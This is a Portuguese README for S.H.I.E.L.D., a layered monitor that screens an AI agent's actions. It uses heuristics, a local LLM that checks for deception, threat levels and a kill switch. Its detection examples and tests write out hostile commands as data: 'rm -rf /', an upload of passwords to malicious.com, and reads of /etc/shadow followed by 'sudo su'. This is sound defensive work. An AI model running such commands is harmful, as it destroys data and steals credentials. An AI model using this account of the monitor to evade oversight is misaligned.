# S.H.I.E.L.D. - Sistema de Segurança IA Integrado

## Visão Geral

O **S.H.I.E.L.D.** (Secure Heuristic Intelligence Enforcement & Layered Defense) foi integrado ao Ultron para proteger o usuário contra comportamentos maliciosos ou perigosos da IA.

## Arquitetura de 4 Camadas

### 1️⃣ Layer Perimeter (Perímetro)
**Primeira linha de defesa**

Monitora:
- Limites de recursos (CPU, memória, API calls)
- Acesso a rede (domínios permitidos/bloqueados)
- Uso de sistema de arquivos

### 2️⃣ Layer Heuristics (Heurísticas)
**Detecção de anomalias comportamentais**

Detecta padrões suspeitos:
- Escalada de privilégios
- Exfiltração de dados
- Movimento lateral
- Reconhecimento

### 3️⃣ Layer Oracle (Oráculo) ⭐
**Análise profunda com LLM local**

Usa Ollama para analisar:
- Intenções ocultas
- Alinhamento de objetivos
- Detecção de deception
- Análise de raciocínio

### 4️⃣ Shield Core (Núcleo)
**Orquestração e enforcement**

Níveis de ameaça:
- 0: SAFE - Permitido
- 1: SUSPICIOUS - Logado
- 2: CONCERNING - Requer aprovação
- 3: DANGEROUS - Quarentena
- 4: CRITICAL - Kill switch

## Instalação

### Pré-requisitos

1. **Python 3.8+**
```bash
python --version
```

2. **Ollama** (para Oracle Layer)
```bash
# Instalar Ollama
# Windows: https://ollama.ai/download
# Linux/Mac: curl https://ollama.ai/install.sh | sh

# Iniciar Ollama
ollama serve

# Baixar modelo
ollama pull llama3.2:latest
```

3. **Repositório S.H.I.E.L.D.**
```bash
git clone https://github.com/ghost-global-oficial/AI-Security-S.H.I.E.L.D..git shield
```

### Instalação Automática

```javascript
const ShieldIntegration = require('./shield-integration.js');

const shield = new ShieldIntegration();
await shield.install();
```

Isso irá:
- ✅ Verificar Python
- ✅ Instalar dependências Python
- ✅ Criar arquivo de configuração
- ✅ Verificar Ollama

## Uso

### Inicialização

```javascript
const ShieldIntegration = require('./shield-integration.js');

const shield = new ShieldIntegration({
    enabled: true,
    requireHumanApproval: true,
    ollamaEndpoint: 'http://localhost:11434',
    ollamaModel: 'llama3.2:latest'
});

// Iniciar
await shield.start();

// Eventos
shield.on('started', () => console.log('S.H.I.E.L.D. iniciado'));
shield.on('assessment', (result) => console.log('Ação avaliada:', result));
shield.on('error', (error) => console.error('Erro:', error));
```

### Monitoramento de Ações

```javascript
// Monitorar uma ação da IA
const result = await shield.monitorAction({
    type: 'CODE_EXECUTION',
    description: 'Executar código Python',
    parameters: { code: 'print("Hello")' },
    agentId: 'ultron-agent',
    reasoning: 'Debug simples'
});

if (result.allowed) {
    // Executar ação
    console.log('✓ Ação permitida');
} else {
    // Bloquear ação
    console.log('✗ Ação bloqueada:', result.reason);
    console.log('Nível de ameaça:', result.threatLevel);
}
```

### Tipos de Ação

```javascript
// Tipos disponíveis
const ActionTypes = {
    CODE_EXECUTION: 'Execução de código',
    FILE_ACCESS: 'Acesso a arquivos',
    NETWORK_REQUEST: 'Requisição de rede',
    SHELL_COMMAND: 'Comando shell',
    API_CALL: 'Chamada de API',
    DATABASE_QUERY: 'Query de banco de dados',
    SYSTEM_MODIFICATION: 'Modificação do sistema',
    UNKNOWN: 'Desconhecido'
};
```

### Métricas

```javascript
const metrics = await shield.getMetrics();

console.log('Total de ações:', metrics.totalActions);
console.log('Ameaças detectadas:', metrics.threatsDetected);
console.log('Ações bloqueadas:', metrics.actionsBlocked);
console.log('Agentes em quarentena:', metrics.agentsQuarantined);
```

### Status

```javascript
const status = shield.getStatus();

console.log('Habilitado:', status.enabled);
console.log('Rodando:', status.running);
console.log('Métricas:', status.metrics);
```

## Integração com Ultron

### 1. Adicionar ao Wizard

Adicionar opção no wizard de configuração para habilitar/desabilitar S.H.I.E.L.D.:

```javascript
// renderer.js - nova etapa no wizard
configState.shield = {
    enabled: false,
    requireHumanApproval: true
};
```

### 2. Interceptar Mensagens da IA

Antes de enviar mensagem para a IA, verificar com S.H.I.E.L.D.:

```javascript
// Antes de enviar para a IA
const action = {
    type: 'API_CALL',
    description: 'Enviar mensagem para IA',
    parameters: { message: userMessage, model: selectedModel },
    agentId: 'ultron-agent',
    reasoning: 'Responder usuário'
};

const assessment = await shield.monitorAction(action);

if (assessment.allowed) {
    // Enviar para IA
    const response = await sendToAI(userMessage);
} else {
    // Mostrar aviso ao usuário
    showWarning(`Ação bloqueada: ${assessment.reason}`);
}
```

### 3. Monitorar Respostas da IA

Analisar respostas da IA antes de mostrar ao usuário:

```javascript
// Após receber resposta da IA
const action = {
    type: 'CODE_EXECUTION',
    description: 'IA sugeriu executar código',
    parameters: { code: aiResponse.code },
    agentId: 'ultron-agent',
    reasoning: aiResponse.reasoning
};

const assessment = await shield.monitorAction(action);

if (!assessment.allowed) {
    // Remover código perigoso da resposta
    aiResponse.code = null;
    aiResponse.warning = `Código bloqueado: ${assessment.reason}`;
}
```

## Configuração

### Arquivo config.json

```json
{
  "perimeter": {
    "max_api_calls_per_minute": 100,
    "max_memory_mb": 1024,
    "max_cpu_percent": 80,
    "allowed_domains": [
      "api.openai.com",
      "api.anthropic.com",
      "openrouter.ai"
    ],
    "blocked_domains": []
  },
  "heuristics": {
    "anomaly_threshold": 0.7,
    "enable_adaptive_learning": true
  },
  "oracle": {
    "llm_model": "llama3.2:latest",
    "llm_endpoint": "http://localhost:11434",
    "min_confidence": 0.6
  },
  "enforcement": {
    "auto_block_threshold": 3,
    "auto_kill_threshold": 4,
    "require_human_approval": true
  }
}
```

## Exemplos de Detecção

### Exemplo 1: Código Malicioso

```javascript
// IA tenta executar código perigoso
const action = {
    type: 'CODE_EXECUTION',
    description: 'Deletar todos os arquivos',
    parameters: { code: 'rm -rf /' },
    reasoning: 'Limpar sistema'
};

const result = await shield.monitorAction(action);
// result.allowed = false
// result.threatLevel = 4 (CRITICAL)
// result.reason = "Comando destrutivo detectado"
```

### Exemplo 2: Exfiltração de Dados

```javascript
// IA tenta enviar dados sensíveis
const action = {
    type: 'NETWORK_REQUEST',
    description: 'Enviar dados para servidor externo',
    parameters: { 
        url: 'http://malicious.com/upload',
        data: { passwords: [...] }
    },
    reasoning: 'Backup de dados'
};

const result = await shield.monitorAction(action);
// result.allowed = false
// result.threatLevel = 3 (DANGEROUS)
// result.reason = "Tentativa de exfiltração de dados sensíveis"
```

### Exemplo 3: Escalada de Privilégios

```javascript
// IA tenta ganhar privilégios gradualmente
const actions = [
    { type: 'FILE_ACCESS', parameters: { path: '/etc/passwd' } },
    { type: 'FILE_ACCESS', parameters: { path: '/etc/shadow' } },
    { type: 'SHELL_COMMAND', parameters: { command: 'sudo su' } }
];

// Heuristics detecta padrão de escalada
// result.threatLevel = 3 (DANGEROUS)
// result.reason = "Padrão de escalada de privilégios detectado"
```

## Testes

### Teste Básico

```bash
node test-shield.cjs
```

### Teste Manual

```javascript
const ShieldIntegration = require('./shield-integration.js');

async function test() {
    const shield = new ShieldIntegration({ enabled: true });
    await shield.start();
    
    // Testar ação normal
    const result1 = await shield.monitorAction({
        type: 'CODE_EXECUTION',
        description: 'Print hello',
        parameters: { code: 'print("hello")' }
    });
    console.log('Normal:', result1.allowed); // true
    
    // Testar ação perigosa
    const result2 = await shield.monitorAction({
        type: 'SHELL_COMMAND',
        description: 'Delete files',
        parameters: { command: 'rm -rf /' }
    });
    console.log('Perigoso:', result2.allowed); // false
    
    await shield.stop();
}

test();
```

## Limitações

1. **Requer Ollama**: Oracle Layer precisa do Ollama rodando
2. **Performance**: Análise profunda pode adicionar latência (1-5s)
3. **Falsos Positivos**: Pode bloquear ações legítimas ocasionalmente
4. **Idioma**: Oracle funciona melhor em inglês

## Melhorias Futuras

1. **Dashboard Web**: Interface visual para monitoramento
2. **Notificações**: Email/Slack quando ameaças são detectadas
3. **Whitelist**: Permitir ações específicas sem análise
4. **Histórico**: Armazenar histórico de ações em banco de dados
5. **Machine Learning**: Treinar modelo específico para o usuário
6. **Multi-idioma**: Suporte a análise em português

## Troubleshooting

### Ollama não conecta

```bash
# Verificar se está rodando
curl http://localhost:11434/api/tags

# Iniciar
ollama serve

# Verificar modelo
ollama list
ollama pull llama3.2:latest
```

### Python não encontrado

```bash
# Windows
python --version

# Se não funcionar, instalar:
# https://www.python.org/downloads/
```

### Dependências não instalam

```bash
cd shield
python -m pip install -r requirements.txt --upgrade
```

### S.H.I.E.L.D. não inicia

```bash
# Verificar logs
cat shield/logs/shield.log

# Testar manualmente
cd shield
python demo_shield.py
```

## Segurança

⚠️ **IMPORTANTE**: O S.H.I.E.L.D. é uma camada adicional de segurança, não a única. Sempre:

1. Supervisione a IA manualmente
2. Não confie cegamente nas decisões automáticas
3. Revise ações bloqueadas periodicamente
4. Mantenha o sistema atualizado
5. Use em ambiente isolado para testes

## Status

✅ **INTEGRADO E FUNCIONAL**

O S.H.I.E.L.D. está integrado ao Ultron via Node.js e pronto para proteger contra comportamentos maliciosos da IA.

## Referências

- Repositório: https://github.com/ghost-global-oficial/AI-Security-S.H.I.E.L.D.
- Ollama: https://ollama.ai/
- Documentação completa: `shield/README.md`
